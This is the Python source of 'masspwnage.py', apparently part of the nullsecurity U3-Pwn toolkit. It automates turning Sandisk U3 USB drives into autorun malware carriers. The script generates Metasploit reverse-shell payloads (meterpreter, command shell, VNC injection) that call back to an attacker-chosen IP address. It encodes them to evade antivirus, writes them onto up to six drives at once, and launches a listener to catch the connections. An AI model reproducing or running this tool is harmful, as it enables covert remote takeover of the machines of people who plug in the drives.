#!/usr/bin/env python
# -*- coding: latin-1 -*- ######################################################
#                ____                     _ __                                 #
#     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           #
#    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                           #
#   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                            #
#                                            /___/ team                        #
#                                                                              #
# masspwnage.py                                                                #
#                                                                              #
# DATE                                                                         #
# 06/27/2012                                                                   #
#                                                                              #
# DESCRIPTION                                                                  #
# U3-Pwn is a tool designed to automate injecting executables to Sandisk       #
# smart usb devices with default U3 software install. This is performed by     # 
# removing the original iso file from the device and creating a new iso        #
# with autorun features.                                                       #
#                                                                              #
# REQUREMENTS                                                                  #
# - Metasploit                                                                 #
# - U3-Tool                                                                    #
# - Python-2.6                                                                 #
#                                                                              #
# AUTHOR                                                                       #
# Zy0d0x - http://www.nullsecurity.net/                                        #
#                                                                              #
################################################################################


try:
    import subprocess
    import pexpect
    import time
    import os
    import sys
    import shutil
except ImportError:
    pass
definepath = os.getcwd()
sys.path.append('%s/src/' % definepath)
import banner

try:
    banner.print_banner()
    payload = \
        raw_input('''    What payload do you want to generate:

    Name:                                                  Description:
    -----                                                  ------------

    1) Windows Meterpreter Reverse_Tcp_Allports            Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager
    2) Windows Shell Reverse_Tcp_Allports                  Windows Command Shell, Reverse All-Port TCP Stager
    3) Windows Vncinject Reverse_Tcp_Allports              VNC Server (Reflective Injection), Reverse All-Port TCP Stager
    4) ShellCodeExec Alphanum Shellcode                    This will drop a meterpreter payload through shellcodeexec (A/V Safe)
      
    Enter number: ''')

    if payload == '1':                                                                                                                                                  
        payload = 'windows/meterpreter/reverse_tcp_allports'                                                                                                            
    if payload == '2':                                                                                                                                                  
        payload = 'windows/shell/reverse_tcp_allports'                                                                                                                  
    if payload == '3':                                                                                                                                                  
        payload = 'windows/vncinject/reverse_tcp_allports'                                                                                                              

    banner.print_banner()
    encoder = \
        raw_input('''    What encoder would you like to try and bypass AV with.
    
    Name:                              Description:
    -----                              -----------
     
    1) avoid_utf8_tolower              Avoid UTF8/tolower               
    2) shikata_ga_nai                  Polymorphic XOR Additive Feedback Encoder 
    3) alpha_mixed                     Alpha2 Alphanumeric Mixedcase Encoder
    4) alpha_upper                     Alpha2 Alphanumeric Uppercase Encoder  
    5) call4_dword_xor                 Call+4 Dword XOR Encoder  
    6) countdown                       Single-byte XOR Countdown Encoder  
    7) fnstenv_mov                     Variable-length Fnstenv/mov Dword XOR Encoder  
    8) jmp_call_additive               Jump/Call XOR Additive Feedback Encoder  
    9) nonalpha                        Non-Alpha Encoder  
   10) nonupper                        Non-Upper Encoder  
   11) unicode_mixed                   Alpha2 Alphanumeric Unicode Mixedcase Encoder 
   12) unicode_upper                   Alpha2 Alphanumeric Unicode Uppercase Encoder                          
   13) No Encoding                     Standard Payload Generation  
   14) Multi-Encoder                   Multiple Iteration Encoding 

    
   Enter number: ''')

    if encoder == '1':
        encoder = 'x86/avoid_utf8_tolower'
    if encoder == '2':
        encoder = 'x86/shikata_ga_nai'
    if encoder == '3':
        encoder = 'x86/alpha_mixed'
    if encoder == '4':
        encoder = 'x86/alpha_upper'
    if encoder == '5':
        encoder = 'x86/call4_dword_xor '
    if encoder == '6':
        encoder = 'x86/countdown'
    if encoder == '7':
        encoder = 'x86/fnstenv_mov'
    if encoder == '8':
        encoder = 'x86/jmp_call_additive'
    if encoder == '9':
        encoder = 'x86/nonalpha'
    if encoder == '10':
        encoder = 'x86/nonupper'
    if encoder == '11':
        encoder = 'x86/unicode_mixed'
    if encoder == '12':
        encoder = 'x86/unicode_upper'
    if encoder == '':
        encoder = 'x86/shikata_ga_nai'

    ip = raw_input('''\n   Enter Ip Address for reverse listener: ''')
    amount = \
        raw_input('''\n   How many devices would to like to change iso image on 2,4,6: '''
                  )

    if ip == '' or amount == '':
        print '''   [-]Ip Address Or Amount Missing Exiting....'''
        time.sleep(2)
        sys.exit(0)
    else:
        if payload == '4':
	    payload = 'windows/meterpreter/reverse_tcp_allports'
            banner.print_banner()
            print '''\n   Generating Shellcode Please Wait...'''
            subprocess.Popen('msfpayload windows/meterpreter/reverse_tcp_allports EXITFUNC=thread  LHOST=%s  R  | msfencode -c 5 -e %s -t raw  | msfencode  -a x86 -e  x86/alpha_mixed -t raw BufferRegister=EAX > resource/payload.txt'
                              % (ip, encoder), stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, shell=True).wait()
            shellcode = open('resource/payload.txt', 'r')
            text = shellcode.readline()
            file = open('resource/LaunchU3.bat', 'w')
            file.write('LaunchU3.exe ' + text)
            file.close()
            os.remove('resource/payload.txt')
            shutil.copy('backup/LaunchU3.exe', 'resource/LaunchU3.exe')
            subprocess.Popen('mkisofs -volid U3\ System -o resource/U3\ System.iso resource/'
                             , stderr=subprocess.PIPE,
                             shell=True).wait()
        else:

            banner.print_banner()
            print '''\n   Generating Shellcode Please Wait...'''
            subprocess.Popen('msfpayload %s LHOST=%s   R  | msfencode  -e %s -t exe  > resource/LaunchU3.exe '
                              % (payload, ip, encoder),
                             stderr=subprocess.PIPE, shell=True).wait()
            file = open('resource/LaunchU3.bat', 'w')
            file.write('LaunchU3.exe')
            file.close()
            subprocess.Popen('mkisofs -volid U3\ System -o resource/U3\ System.iso resource/'
                             , stderr=subprocess.PIPE,
                             shell=True).wait()

    if amount == '2':
        device1 = \
            raw_input('''\n   Enter the device to change iso image on (example /dev/sde1): '''
                      )
        device2 = raw_input('''\n   Enter next device: ''')
        if device1 == '' or device2 == '':
            print '''   [-]Device Missing Exiting....'''
            time.sleep(2)
            sys.exit(0)
        else:
            child1 = pexpect.spawn('u3-tool -v  -p 1302528 ' + device1)
            child1.sendline('y')
            child1 = pexpect.spawn('u3-tool -v  -p 1302528 ' + device2)
            child1.sendline('y')
            time.sleep(5)
            subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                             % device1, shell=True).wait()
            time.sleep(1)
            subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                             % device2, shell=True).wait()
            os.remove('resource/LaunchU3.bat')
            os.remove('resource/LaunchU3.exe')
            os.system('rm resource/U3\ System.iso')

    if amount == '4':
        device1 = \
            raw_input('''\n   Enter the device to change iso image on (example /dev/sde1): '''
                      )
        device2 = raw_input('''\n   Enter next device: ''')
        device3 = raw_input('''\n   Enter next device: ''')
        device4 = raw_input('''\n   Enter next device: ''')

        if device1 == '' or device2 == '' or device3 == '' or device4 \
            == '':
            print '''   [-]Device Missing Exiting....'''
            time.sleep(2)
            sys.exit(0)
        else:
            child1 = pexpect.spawn('u3-tool -v  -p 1302528 ' + device1)
            child1.sendline('y')
            child1 = pexpect.spawn('u3-tool -v  -p 1302528 ' + device2)
            child1.sendline('y')
            child1 = pexpect.spawn('u3-tool -v  -p 1302528 ' + device3)
            child1.sendline('y')
            child1 = pexpect.spawn('u3-tool -v  -p 1302528 ' + device4)
            child1.sendline('y')
            time.sleep(5)
            subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                             % device1, shell=True).wait()
            subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                             % device2, shell=True).wait()
            subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                             % device3, shell=True).wait()
            subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                             % device4, shell=True).wait()
            time.sleep(2)
            os.remove('resource/LaunchU3.bat')
            os.remove('resource/LaunchU3.exe')
            os.system('rm resource/U3\ System.iso')

    if amount == '6':
        device1 = \
            raw_input('''\n   Enter the device to change iso image on (example /dev/sde1): '''
                      )
        device2 = raw_input('''\n   Enter next device: ''')
        device3 = raw_input('''\n   Enter next device: ''')
        device4 = raw_input('''\n   Enter next device: ''')
        device5 = raw_input('''\n   Enter next device: ''')
        device6 = raw_input('''\n   Enter next device: ''')

        if device1 == '' or device2 == '' or device3 == '' or device4 \
            == '' or device4 == '' or device6 == '':
            print '''   [-]Device Missing Exiting....'''
            time.sleep(2)
            sys.exit(0)
        else:
            child1 = pexpect.spawn('u3-tool -v  -p 1302528 ' + device1)
            child1.sendline('y')
            child1 = pexpect.spawn('u3-tool -v  -p 1302528 ' + device2)
            child1.sendline('y')
            child1 = pexpect.spawn('u3-tool -v  -p 1302528 ' + device3)
            child1.sendline('y')
            child1 = pexpect.spawn('u3-tool -v  -p 1302528 ' + device4)
            child1.sendline('y')
            child1 = pexpect.spawn('u3-tool -v  -p 1302528 ' + device5)
            child1.sendline('y')
            child1 = pexpect.spawn('u3-tool -v  -p 1302528 ' + device6)
            child1.sendline('y')
            time.sleep(5)
            subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                             % device1, shell=True).wait()
            subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                             % device2, shell=True).wait()
            subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                             % device3, shell=True).wait()
            subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                             % device4, shell=True).wait()
            subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                             % device5, shell=True).wait()
            subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                             % device6, shell=True).wait()
            os.remove('resource/LaunchU3.bat')
            os.remove('resource/LaunchU3.exe')
            os.system('rm resource/U3\ System.iso')

    listener = \
        raw_input('''\n   Do you want to start a listener to receive the payload yes or no: '''
                  )
    if listener == 'yes' or listener == 'y':
        if amount == '2':
            banner.print_banner()
            print '''   Starting Listener With 2 Jobs'''
            file = open('rc/2.rc', 'w')
            file.write('use exploit/multi/handler \n')
            file.write('set PAYLOAD %s \n' % payload)
            file.write('set LHOST 0.0.0.0 \n')
            file.write('exploit -j \n')
            file.write('set LPORT 2 \n')
            file.write('exploit -j')
            file.close()
            subprocess.Popen('msfconsole -q -r rc/2.rc',
                             shell=True).wait()
        if amount == '4':
            banner.print_banner()
            print '''   Starting Listener With 4 Jobs'''
            file = open('rc/4.rc', 'w')
            file.write('use exploit/multi/handler \n')
            file.write('set PAYLOAD %s \n' % payload)
            file.write('set LHOST 0.0.0.0 \n')
            file.write('exploit -j \n')
            file.write('set LPORT 2 \n')
            file.write('exploit -j \n')
            file.write('set LPORT 3 \n')
            file.write('exploit -j \n')
            file.write('set LPORT 4 \n')
            file.write('exploit -j')
            file.close()
            subprocess.Popen('msfconsole -q -r rc/4.rc',
                             shell=True).wait()
        if amount == '6':
            banner.print_banner()
            print '''   Starting Listener With 6 Jobs'''
            file = open('rc/6.rc', 'w')
            file.write('use exploit/multi/handler \n')
            file.write('set PAYLOAD %s \n' % payload)
            file.write('set LHOST 0.0.0.0 \n')
            file.write('exploit -j \n')
            file.write('set LPORT 2 \n')
            file.write('exploit -j \n')
            file.write('set LPORT 3 \n')
            file.write('exploit -j \n')
            file.write('set LPORT 4 \n')
            file.write('exploit -j')   
            file.write('set LPORT 5 \n')
            file.write('exploit -j \n ')
            file.write('set LPORT 6 \n')
            file.write('exploit -j')
            
            subprocess.Popen('msfconsole -q -r rc/6.rc',
                             shell=True).wait()
    else:

        print '''   Generation Complete Returning To Menu....'''
        time.sleep(2)
except KeyboardInterrupt:

    print '''

   [-]Keyboard Interrupt Detected, Returning To Menu....'''
    time.sleep(2)
except Exception, error:
    print '''

   [-]Something went wrong, printing error message....'''
    print error
    time.sleep(2)
    sys.exit(0)
